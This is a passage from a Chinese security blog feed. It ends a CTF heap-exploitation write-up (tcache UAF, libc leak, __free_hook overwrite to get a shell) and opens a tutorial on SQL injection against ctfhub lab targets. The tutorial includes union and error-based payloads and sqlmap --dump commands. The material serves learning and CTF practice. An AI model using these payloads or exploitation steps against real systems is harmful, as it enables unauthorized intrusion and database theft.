<p>（3）将物理堆块为chunk0，逻辑为chunk1的factory[1]_buf改写为’&#x2F;bin&#x2F;sh\x00’，修改__free_hook为system地址。</p>
<p>修改factory[1]_buf为’&#x2F;bin&#x2F;sh\x00’</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_GBGYY98JXSD8Z27.jpg"
                      alt="img"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_DYS48TUVAJY4QZ2.jpg"
                      alt="img"
                ></p>
<p>此时tcache bin中还剩下__free_hook地址。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_YDCJ64QZPUGV3WK.jpg"
                      alt="img"
                ></p>
<p>再次申请得到__free__hook+0x10处的堆块，此时修改__free_hook为system。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_VRQR9A9XJBAS7JG.jpg"
                      alt="img"
                ></p>
<p>（4）free(‘&#x2F;bin&#x2F;sh\x00’);</p>
<p>最后 destory(1)，也就是free(‘&#x2F;bin&#x2F;sh\x00’)即可getshell</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_SMCEP4CKXCCRSW4.jpg"
                      alt="img"
                ></p>
<h2 id="BCTF2018-houseofatum"><a href="#BCTF2018-houseofatum" class="headerlink" title="BCTF2018-houseofatum"></a>BCTF2018-houseofatum</h2><p><strong>1.修改rpath</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_PFF4YXVDNYUVCXK.jpg"
                      alt="img"
                ></p>
<p><strong>2.检查保护</strong></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_JZEK39HH86HYX8Y.jpg"
                      alt="img"
                ></p>
<p><strong>3.试运行</strong></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_QWRKEKAF4E79ZBZ.jpg"
                      alt="img"
                ></p>
<p><strong>4.逆向分析</strong></p>
<p>1-alloc函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">int alloc()</span><br><span class="line">&#123;</span><br><span class="line">  int i; // [rsp+Ch] [rbp-4h]</span><br><span class="line">  // 只允许两个堆块同时存在</span><br><span class="line">  for ( i = 0; i &lt;= 1 &amp;&amp; *((_QWORD *)&amp;notes + i); ++i );</span><br><span class="line">  if ( i == 2 )</span><br><span class="line">    return puts(&quot;Too many notes!&quot;);</span><br><span class="line">  printf(&quot;Input the content:&quot;);</span><br><span class="line">  //  利用notes[i]管理note，实际大小为0x50。</span><br><span class="line">  *((_QWORD *)&amp;notes + i) = malloc(0x48uLL);</span><br><span class="line">  readn(*((void **)&amp;notes + i), 0x48uLL);</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">ssize_t __fastcall readn(void *a1, size_t a2)</span><br><span class="line">&#123;</span><br><span class="line">  return read(0, a1, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>2-edit函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">int edit()</span><br><span class="line">&#123;</span><br><span class="line">  signed int v1; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;Input the idx:&quot;);</span><br><span class="line">  v1 = getint();</span><br><span class="line">  if ( (unsigned int)v1 &gt; 1 || !*((_QWORD *)&amp;notes + v1) )</span><br><span class="line">    return puts(&quot;No such note!&quot;);</span><br><span class="line">  printf(&quot;Input the content:&quot;);</span><br><span class="line">  // 读取0x48可能存在泄露</span><br><span class="line">  readn(*((void **)&amp;notes + v1), 0x48uLL);</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>3-del函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned __int64 del()</span><br><span class="line">&#123;</span><br><span class="line">  signed int v1; // [rsp+0h] [rbp-10h]</span><br><span class="line">  char v2[2]; // [rsp+6h] [rbp-Ah] BYREF</span><br><span class="line">  unsigned __int64 v3; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  printf(&quot;Input the idx:&quot;);</span><br><span class="line">  v1 = getint();</span><br><span class="line">  if ( (unsigned int)v1 &lt;= 1 &amp;&amp; *((_QWORD *)&amp;notes + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    free(*((void **)&amp;notes + v1));</span><br><span class="line">    printf(&quot;Clear?(y/n):&quot;);</span><br><span class="line">    // 输入n，可以导致UAF漏洞。</span><br><span class="line">    readn(v2, 2uLL);</span><br><span class="line">    if ( v2[0] == &#x27;y&#x27; )</span><br><span class="line">      *((_QWORD *)&amp;notes + v1) = 0LL;</span><br><span class="line">    puts(&quot;Done!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No such note!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>4-show函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">int show()</span><br><span class="line">&#123;</span><br><span class="line">  signed int v1; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;Input the idx:&quot;);</span><br><span class="line">  v1 = getint();</span><br><span class="line">  if ( (unsigned int)v1 &gt; 1 || !*((_QWORD *)&amp;notes + v1) )</span><br><span class="line">    return puts(&quot;No such note!&quot;);</span><br><span class="line">  printf(&quot;Content:&quot;);</span><br><span class="line">  puts(*((const char **)&amp;notes + v1));</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>5.漏洞利用</strong></p>
<p>（1）泄露堆地址。</p>
<p>申请两个chunk分别记为chunk0，chunk1。把chunk1的第8个0x8处填写为0x11，防止与top chunk合并。</p>
<p>此时 chunk1 结构如图：</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_JGNR9UDE89QPQV8.jpg"
                      alt="img"
                ></p>
<p>此时heap结构。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_8PMV886RQEQ2XPB.jpg"
                      alt="img"
                ></p>
<p>然后将chunk0释放6次，填满tcache，并选择’n’来构成UAF漏洞。</p>
<p>此时heap和bins结构如下。chunk0的fd为自身地址，show(0)即可泄露堆地址。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_VQRTTYAUDKZ7CBK.jpg"
                      alt="img"
                ></p>
<p>（2）泄露libc基址</p>
<p>再次释放chunk0，并将其fd清空。因为tcache已满7个，所以此时chunk0会进入fast bin。</p>
<p>tcache指向fd位置，而fast bin则指向prev_size，所以chunk0在fast bin中比tcache多0x10。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_P2K9PJJ3XY23DRF.jpg"
                      alt="img"
                ></p>
<p>现在申请一个堆块将会从tcache中获取，将其fd改为(chunk0_fd-0x20)，那么fast bin 将会把(chunk0_fd-0x20)链接进来。</p>
<p>因为将chunk0从tcache中取走，tcache为空，但实际只取走一个堆块，所以counts[0x50]计数为6。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4UUX9X9XCFV3P3S.jpg"
                      alt="img"
                ></p>
<p>再次申请一个堆块，由于tcache为空，那么会去fastbin中寻找，</p>
<p>因为成功从fastbin中返回了堆块，会触发tcache存放机制，将fastbin剩余堆块加入tcache，</p>
<p>又因为fast bin指向prev_size，tcache指向fd，所以将fastbin中堆块加入tcache时，地址会加0x10。</p>
<p>取出的堆块在notes[1]，其用户地址在chunk0_fd(正常)，而tcache中的chunk则指向了chunk0_prev_size位置。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_AP5DUCCCSS6XNBH.jpg"
                      alt="img"
                ></p>
<p>此时，free掉notes[1]，将chunk0放进fast bin中，</p>
<p>然后再次申请一个堆块，此堆块由notes[1]管理，将chunk0的size修改为0x91，方便之后的unsorted bin attack。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_X83SEQ6GBB7AAN8.jpg"
                      alt="img"
                ></p>
<p>此时，notes[0]的fake_chunk0大小已被修改为0x91，释放8次notes[0]即可将fake_chunk0放进unsorted bin。</p>
<p>然后其fd和bk指针将被修改为一个栈上的地址(main_arena+88)</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_9YWKZ4DXCQ5QRBT.jpg"
                      alt="img"
                ></p>
<p>计算其与libc基地址的偏移。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_SH8FTTPY2M66RRC.jpg"
                      alt="img"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_HXUYZWCQP9QHCS3.jpg"
                      alt="img"
                ></p>
<p>因为输出用到puts函数，而这个栈地址在fake_chunk0_fd位置，</p>
<p>所以需要利用notes[1]将fake_chunk0的的prev_size和size填满泄露libc地址时才能避免截断。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_QMVR2WYC2N9A88H.jpg"
                      alt="img"
                ></p>
<p>将泄露出来的栈地址减去计算出来的偏移，即可得到libc基址。</p>
<p>（3）将__free_hook替换为one_gadget。</p>
<p>利用one_gadget工具获取one_gadget。</p>
<p>因为已经得到了libc基址，那么可以根据给的libc-2.26.so得到__free_hook和one_gadget的运行时真实地址。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_MN5N9AXJB8D5WK9.jpg"
                      alt="img"
                ></p>
<p>利用notes[1]可以将fake_chunk0_fd改为__free_hook-0x10的地址。</p>
<p>此时fastbin将__free_hook链接进来了。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_ANN46ZTE7FJ6HPR.jpg"
                      alt="img"
                ></p>
<p>再次申请一个堆块，会由notes[0]来管理。并且会触发tcache相关机制，将fastbin中剩余chunk（__free_hook）加入tcache。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_6THJNUWWQWE2UDG.jpg"
                      alt="img"
                ></p>
<p>此时因为管理已满两个，需要将notes[0]释放并清0。由于tcache已满，其会进入fastbin。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_J5ETUWKBVKPC2GE.jpg"
                      alt="img"
                ></p>
<p>此时在申请的堆块会由notes[0]管理，再次申请一个堆块则会从tcache中获取__free_hook的地址，将其修改为one_gadget。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_SHPQPCWP6VZ5YXR.jpg"
                      alt="img"
                ></p>
<p>此时随便del一个notes[i]就会触发one_gadget，从而getshell；<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_35RYCASC2VV4JFH.jpg"
                      alt="img"
                ></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Pwn_Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全-SQL_injection</title>
    <url>/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>要学一下IOT安全，但我web方面还是个小白，所以有了二进制选手的web安全之路这个系列。我打算把每天学的web安全以及渗透相关的知识积累起来，每篇文章作为一个专题，后续如果发现了这个专题的其他内容，也会补充这些新内容。本着开源精神，利己利他，后续有和我一样的同学也能少走些弯路。</p>
<h1 id="sql注入基础"><a href="#sql注入基础" class="headerlink" title="sql注入基础"></a>sql注入基础</h1><p>靶场环境 ：<strong>ctfhub技能数-&gt;web-&gt;sql注入</strong><br>注入参数为整数类型，语句类似 <strong>select * from news where id&#x3D;参数</strong>。</p>
<h2 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h2><h3 id="手动解法"><a href="#手动解法" class="headerlink" title="手动解法"></a>手动解法</h3><ol>
<li>可以根据回显结果来判断我们插入的语句是否被解析为 sql 语法，是否存在整数注入。</li>
</ol>
<ul>
<li>有回显<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694916260_65065ea4ef5f74197d22d.jpeg"
                      alt="图片.png"
                ></li>
<li>无回显<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694916280_65065eb84cc85d0f84691.jpeg"
                      alt="图片.png"
                ></li>
</ul>
<ol start="2">
<li>确认查询列数。输入到 3 时返回错误，所以列数为 2 。</li>
</ol>
<ul>
<li>输入<code>1 order by 1</code>有回显。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694916304_65065ed0c6d83b7476271.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>1 order by 2</code>有回显。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694916380_65065f1ce90b56a129953.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>1 order by 3</code>无回显。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694916437_65065f554ccda7aa2c70c.jpeg"
                      alt="图片.png"
                ></li>
</ul>
<ol start="3">
<li>通过<code>union</code>注入查询数据。<a class="link"   href="https://blog.csdn.net/qq_33704186/article/details/81909276#:~:text=1%20UNION%E5%BF%85%E9%A1%BB%E7%94%B1%E4%B8%A4%E6%9D%A1%E4%BB%A5%E4%B8%8A%E7%9A%84SELECT%E8%AF%AD%E5%8F%A5%E7%BB%84%E6%88%90%EF%BC%8C%E8%AF%AD%E5%8F%A5%E4%B9%8B%E9%97%B4%E7%94%A8%E5%85%B3%E9%94%AE%E5%AD%97UNION%E5%88%86%E5%89%B2%E3%80%82%202%20UNION%E4%B8%AD%E7%9A%84%E6%AF%8F%E4%B8%AA%E6%9F%A5%E8%AF%A2%E5%BF%85%E9%A1%BB%E5%8C%85%E5%90%AB%E7%9B%B8%E5%90%8C%E7%9A%84%E5%88%97%E3%80%81%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%88%96%E8%81%9A%E9%9B%86%E5%87%BD%E6%95%B0%EF%BC%88%E5%90%84%E4%B8%AA%E5%88%97%E4%B8%8D%E9%9C%80%E8%A6%81%E4%BB%A5%E7%9B%B8%E5%90%8C%E7%9A%84%E6%AC%A1%E5%BA%8F%E5%88%97%E5%87%BA%EF%BC%89%E3%80%82,3%20%E5%88%97%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%BF%85%E9%A1%BB%E5%85%BC%E5%AE%B9%EF%BC%9A%E7%B1%BB%E5%9E%8B%E4%B8%8D%E5%BF%85%E5%AE%8C%E5%85%A8%E7%9B%B8%E5%90%8C%EF%BC%8C%E4%BD%86%E5%BF%85%E9%A1%BB%E6%98%AFDBMS%E5%8F%AF%E4%BB%A5%E9%9A%90%E5%90%AB%E5%9C%B0%E8%BD%AC%E6%8D%A2%E7%9A%84%E7%B1%BB%E5%9E%8B%E3%80%82%204%20%E5%A6%82%E6%9E%9C%E5%8F%96%E5%87%BA%E6%9D%A5%E7%9A%84%E6%95%B0%E6%8D%AE%E4%B8%8D%E9%9C%80%E8%A6%81%E5%8E%BB%E9%87%8D%EF%BC%8C%E4%BD%BF%E7%94%A8UNION%20ALL%E3%80%82" >union 联合查询 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>语句内部每个 select 语句必须拥有相同的列。<code>union</code>也可用于查询列数。</li>
</ol>
<ul>
<li>输入<code>union select 1</code>无回显。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694916765_6506609dab540b6023728.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>union select 1,2</code>有回显。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694916821_650660d546a90eeed092e.jpeg"
                      alt="图片.png"
                ></li>
</ul>
<ol start="4">
<li>利用<code>union</code>查询数据库名。</li>
</ol>
<ul>
<li>输入<code>-1 union select 1,database()</code>。让<code>id=-1</code>因为回显只有一行数据，需要让第一个 select 语句返回空。这里查询到一个<code>sqli</code>数据库。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694917239_650662772b8e7111dc06f.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>-1 union select 1,table_name from information_schema.tables where table_schema=&#39;sqli&#39;</code>。Mysql5.0以上版本中<code>information_schema</code>默认库保存了所有数据库信息。这里我们查询到了一个<code>flag</code>表。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694917671_650664275ef10bfc36caa.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;sqli&#39;</code>。通过<code>group_concat()</code>函数将多条数据组合成字符串输出，或者通过<code>limit</code>函数选择输出第几条数据。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694918028_6506658c3aaaad01f227a.jpeg"
                      alt="图片.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694918269_6506667d5ea3ec2a0c007.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#39;sqli&#39; and table_name=&#39;flag&#39;</code>，同样通过<code>information_schema</code>查询列名。flag 表中 只有一个 flag 列。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694918728_65066848ed5194e1132da.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>-1 union select 1,group_concat(flag) from sqli.flag</code>。直接查询 flag 列中数据即可。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694918968_650669383b276fdeff2c2.jpeg"
                      alt="图片.png"
                ></li>
</ul>
<h3 id="sqlmap解法"><a href="#sqlmap解法" class="headerlink" title="sqlmap解法"></a>sqlmap解法</h3><ul>
<li>输入<code>sqlmap --purge</code>清除原有数据。</li>
<li>输入<code>sqlmap -u http://challenge-3da5ad86434a80f6.sandbox.ctfhub.com:10800/?id=1 --tables</code>。<code>-u</code>指定<code>url</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694925726_6506839ed41f7be2b056e.jpeg"
                      alt="图片.png"
                ><br>反馈<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694925791_650683dfc0312ff3118a9.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>sqlmap -u http://challenge-3da5ad86434a80f6.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables</code>。<code>-D</code>指定数据库。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694925898_6506844a0ba4ae76ab779.jpeg"
                      alt="图片.png"
                ><br>反馈<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694925919_6506845fcf0c913dbdef5.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>sqlmap -u http://challenge-3da5ad86434a80f6.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables --dump</code>, –dump 获取字段数据，或者输入<code>sqlmap -u http://challenge-3da5ad86434a80f6.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --tables --dump</code>，-T 指定表名。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694926146_65068542367ee69412f81.jpeg"
                      alt="图片.png"
                ></li>
</ul>
<h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><h3 id="手动解法-1"><a href="#手动解法-1" class="headerlink" title="手动解法"></a>手动解法</h3><ol>
<li>判断列数。原理一样，记得输入<code>&#39;</code>闭合操作，然后注释掉后面自带的<code>&#39;</code>，<code>-- </code> 注释记得加一个空格，<code>#</code>则不用加空格。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694920851_650670932e7b75ae5560e.jpeg"
                      alt="图片.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694920866_650670a27aff291856c84.jpeg"
                      alt="图片.png"
                ></li>
<li>查询 flag。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694920986_6506711accedcd1cc6251.jpeg"
                      alt="图片.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694921008_6506713068062018bc4ff.jpeg"
                      alt="图片.png"
                ></li>
</ol>
<h3 id="sqlmap解法-1"><a href="#sqlmap解法-1" class="headerlink" title="sqlmap解法"></a>sqlmap解法</h3><ul>
<li>输入<code>sqlmap --purge</code>清除原有数据。</li>
<li>解法和<code>整数型注入</code>相同。</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://challenge-ced5aff6454f7ff0.sandbox.ctfhub.com:10800/?id=1</span><br><span class="line">sqlmap -u http://challenge-ced5aff6454f7ff0.sandbox.ctfhub.com:10800/?id=1 --current-db</span><br><span class="line">sqlmap -u http://challenge-ced5aff6454f7ff0.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables</span><br><span class="line">sqlmap -u http://challenge-ced5aff6454f7ff0.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --dump</span><br></pre></td></tr></table></figure></div>

<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>在无法利用<code>union</code>注入并回显报错信息时，可采用报错注入。人为制造错误条件，在报错信息中返回完整查询结果。</p>
<h3 id="手动解法-2"><a href="#手动解法-2" class="headerlink" title="手动解法"></a>手动解法</h3><ol>
<li>利用<code>extractvalue(XML_document, XPath_string)</code>和<code>updatexml(XML_document, XPath_string, new_value)</code>函数进行报错注入。<a class="link"   href="https://cloud.tencent.com/developer/article/1740429" >extractvalue()和updatexml() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>函数第二个参数不合法时，会将查询结果放在报错信息中。但 extractvalue() 函数最长报错32位。</li>
</ol>
<ul>
<li>输入 <code>1 and (extractvalue(1,concat(0x7e,(select database()),0x7e)))</code>。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694939858_6506bad23ae2111ed3a0c.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>1 and (extractvalue(1,concat(0x7e,(select flag from flag),0x7e)))</code>。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694939924_6506bb1469825c430249c.jpeg"
                      alt="图片.png"
                ></li>
</ul>
